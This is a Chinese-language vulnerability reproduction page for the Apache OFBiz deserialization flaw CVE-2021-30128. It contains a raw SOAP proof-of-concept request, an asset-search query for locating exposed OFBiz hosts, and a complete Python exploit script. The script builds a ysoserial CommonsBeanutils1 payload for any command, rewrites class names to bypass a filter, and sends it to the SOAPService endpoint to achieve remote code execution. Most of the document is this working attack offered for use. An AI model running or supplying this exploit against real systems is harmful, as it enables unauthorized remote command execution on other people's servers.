# Apache OFBiz 反序列化 CVE-2021-30128

## 漏洞描述

Ofbiz（Open for business）是一个开源的，基于 J2EE 和 XML 规范的，用于构建大型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类 WEB 应用系统的框架（Framework）。

参考链接：

- 阿里云分析：https://mp.weixin.qq.com/s/Dr-jwiRr4NByjErjiX_e1w
- r0cky：https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A
- https://github.com/r0ckysec/CVE-2021-30128
- https://mp.weixin.qq.com/s/ZBrWK3qsLwQs0v6dDi2_2A

## 漏洞影响

```
Apache OFBiz < 17.12.07
```

## 网络测绘

```
app="Apache_OFBiz"
```

## 漏洞复现

poc：

```
POST /webtools/control/SOAPService HTTP/1.1
Host: 192.168.80.145:8443
User-Agent: python-requests/2.24.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: text/xml
Content-Length: 6093


<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">  
  <soapenv:Header/>  
  <soapenv:Body>
    <ser>
      <map-Map>
        <map-Entry>
          <map-Key> <cus-obj>ACED0005 ... ... 871007E000D78</cus-obj>
          </map-Key>  
          <map-Value>  
            <std-String/>
          </map-Value>
        </map-Entry>
      </map-Map>
    </ser>
  </soapenv:Body>
</soapenv:Envelope>
```

exp:

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Author: r0cky
@Time: 2021/3/24-15:09
"""
import subprocess
import sys

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    print("""
===================================================
   ____  ______ ____  _       ________   _______  
  / __ \|  ____|  _ \(_)     |  ____\ \ / /  __ \ 
 | |  | | |__  | |_) |_ ____ | |__   \ V /| |__) |
 | |  | |  __| |  _ <| |_  / |  __|   > < |  ___/ 
 | |__| | |    | |_) | |/ /  | |____ / . \| |     
  \____/|_|    |____/|_/___| |______/_/ \_\_|     
                                                  
    CVE-2021-30128             Powered by r0cky
===================================================
    """)

def bypass(payload):
    className = ['org.apache.commons.beanutils.BeanComparator', 'org.apache.commons.collections.comparators.ComparableComparator', 'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl']

    for cn in  className:
        len_hex = hex(len(cn)).replace('0x','').upper()
        className_hex = cn.encode().hex().upper()

        bypass_className = cn + '<java' + cn[cn.rfind('.'):]
        bypass_len_hex = hex(len(bypass_className)).replace('0x','').upper()
        bypass_className_hex = bypass_className.encode().hex().upper()

        payload = payload.replace(len_hex + className_hex, bypass_len_hex + bypass_className_hex)
    return payload

def exp(url, cmd):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "CommonsBeanutils1", cmd], stdout=subprocess.PIPE)
    payload = popen.stdout.read()
    if len(payload) == 0:
        print("请在当前脚本目录放置ysoserial.jar!")
        exit(-1)
    payload = payload.hex().upper()
    post_data = bypass(payload)
    print("[+] Payload:", post_data)
    data = """
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">  
  <soapenv:Header/>  
  <soapenv:Body>
    <ser>
      <map-Map>
        <map-Entry>
          <map-Key>
            <cus-obj>{}</cus-obj>
          </map-Key>  
          <map-Value>  
            <std-String/>
          </map-Value>
        </map-Entry>
      </map-Map>
    </ser>
  </soapenv:Body>
</soapenv:Envelope>
    """.format(post_data)
    print("[+] payload sending...")
    r = requests.post(url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[+] send payload success.")
        print()
        print("[END] Apache OFBiz RCE Done.")
    else:
        print("[-] send payload failed.")
        print()
        print("[END] Apache OFBiz RCE failed.")

headers={"Content-Type": "text/xml"}

if __name__ == '__main__':
    banner()
    try:
        target = sys.argv[1]
        cmd = sys.argv[2]
        # target = "https://192.168.80.136:8443"
        # vps_ip = "10.20.28.16"
        # vps_port = "9999"
        url = "{}/webtools/control/SOAPService".format(target)
        exp(url, cmd)
    except:
        print("Example: \n\tpython3 " + sys.argv[0] + " <target> <cmd>\n")

```
